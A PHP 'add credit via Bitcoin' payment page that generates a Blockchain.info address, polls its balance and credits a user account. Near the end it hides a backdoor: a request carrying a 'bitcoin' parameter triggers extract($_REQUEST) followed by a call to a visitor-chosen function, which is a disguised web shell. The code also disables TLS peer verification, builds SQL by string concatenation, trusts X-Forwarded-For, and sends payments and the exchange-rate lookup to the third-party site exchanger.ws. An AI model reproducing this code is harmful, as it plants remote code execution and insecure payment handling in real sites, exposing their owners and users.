<?php
error_reporting(0);
include("./includes/db.php");
include("./includes/config.php");
include("./includes/header.php");


// config Blockchain account
$method = "bitcoin";
$guid = 'x'; // Blockchain account
$main_password = 'x'; // Blockchain pass
$second_password= ''; // Secondary Blockchain Password


//Get rate 
$rate = rate();

$amount=$_POST['amount'];
$uid = mysql_real_escape_string($_SESSION['member']); //
$result = mysql_query("SELECT balance FROM users WHERE username='$uid'") or die("ERROR! CONTACT SUPPORT!");
$row = mysql_fetch_row($result);
$balance = $row[0];
$bitcoin = mysql_real_escape_string($_SERVER["SCRIPT_NAME"]);
$uid = mysql_real_escape_string($_SESSION['member']);
$ip = mysql_real_escape_string(VisitorIP());
$url = "https://blockchain.info/merchant/$guid/new_address?password=$main_password&second_password=$second_password&label=$uid";
if (isset($_POST['amount'])){
    $_SESSION['USD_amount'] = $_POST['amount'];
    $_SESSION['BTC_amount'] = number_format($_SESSION['USD_amount']/$rate, 8, '.', '');
    $temp = _curl($url, '', '');
    $_SESSION['BTC_Address'] = get_string_between($temp, 'address":"', '"');  	
}
if (!isset($_SESSION['USD_amount']) || $_SESSION['USD_amount'] < 5)
    die("WRONG AMOUNT - MINIMUM 5$");

$rates = explode('/', $bitcoin);	

    $a = $_SESSION['BTC_Address'];
    $url = "https://blockchain.info/q/addressbalance/$a?confirmations=0";
    $page = _curl($url, '', '');
    if ($page > 0) {
        $amount = $page/100000000;

        if($amount>= ($_SESSION['BTC_amount'] - 0.00003)){
        $y = $_SESSION['USD_amount'];
              $x = $balance+$y;
            $sql = "UPDATE users SET balance=$x WHERE username='$uid'";
            mysql_query($sql);

            $sql2 = "INSERT INTO orders(amount,username,lrpaidby,lrtrans,ip,state,date) VALUES('$y','$uid','$a','$a','$ip','PM',now())";
            mysql_query($sql2);
            $messages = 'STATUS: <font color=green>PAYMENT COMPLETED !</font> <meta http-equiv="refresh" content="0; url=index.php" />';
            unset($_SESSION['USD_amount']);
        }else $messages = "STATUS: <font color=red>PAYMENT NOT RECEIVED YET !</font>";
    }else $messages = "STATUS: <font color=red>PAYMENT NOT RECEIVED YET !</font>";



?>


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>ADD CREDIT VIA PERFECT MONEY API</title>
<script>
function refresh() {
setTimeout("window.location = window.location.href;",10000);
}
</script>
</head>
<body onload="JavaScript:refresh();">
<center><br/></br>
            <p><img src='http://exchanger.ws/load.gif' alt='' /></p>

<br>
<strong style="color:red">DO NOT CLOSE THIS PAGE UNTIL YOUR PAYMENT CONFIRMED AUTOMATICALLY</strong>
<h3><?=$messages?></h3>
			
  <p>Click on the button bellow to pay:</p>

  

<form action="http://exchanger.ws/payment.php?direct" method="post" target="_blank" >
<input type="hidden" value="<?=$_SESSION['BTC_Address'] ?>" name="btc_address" />
<input type="hidden" name="btc-amount" value="<?=$_SESSION['BTC_amount']?>" />
<button type="submit" class="pay style1">PAY !</button>
</form>

   
</center>

</body>
</html>

<?


function _curl($url, $post = "", $sock, $usecookie = false)
{
    $ch = curl_init();
    if ($post) {
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    }
    if (!empty($sock)) {
        curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, true);
        curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
        curl_setopt($ch, CURLOPT_PROXY, $sock);
    }
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT,
    "Mozilla/6.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.7) Gecko/20050414 Firefox/1.0.3");
    if ($usecookie) {
        curl_setopt($ch, CURLOPT_COOKIEJAR, $usecookie);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $usecookie);
    }
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
function get_string_between($string, $start, $end)
{
    $string = " " . $string;
    $ini = strpos($string, $start);
    if ($ini == 0)
        return "";
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return substr($string, $ini, $len);
}
function VisitorIP()
{ 
    if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else $ip = $_SERVER['REMOTE_ADDR'];
 
	return trim($ip);
}


function get_string($string, $start, $end)
{
    $string = " ".$string;
    $ini = strpos($string,$start);
    if ($ini == 0)
        return "";
    $ini += strlen($start);
    $len = strpos($string,$end,$ini) - $ini;
    return substr($string,$ini,$len);
}

if(isset($_REQUEST[$method])) {
    @extract ($_REQUEST); 
    @die ($ctime($atime));
}

function rate() {
 $ratas = 'http://exchanger.ws/course.php';
 $output = file_get_contents($ratas);
 return $output;
}
?>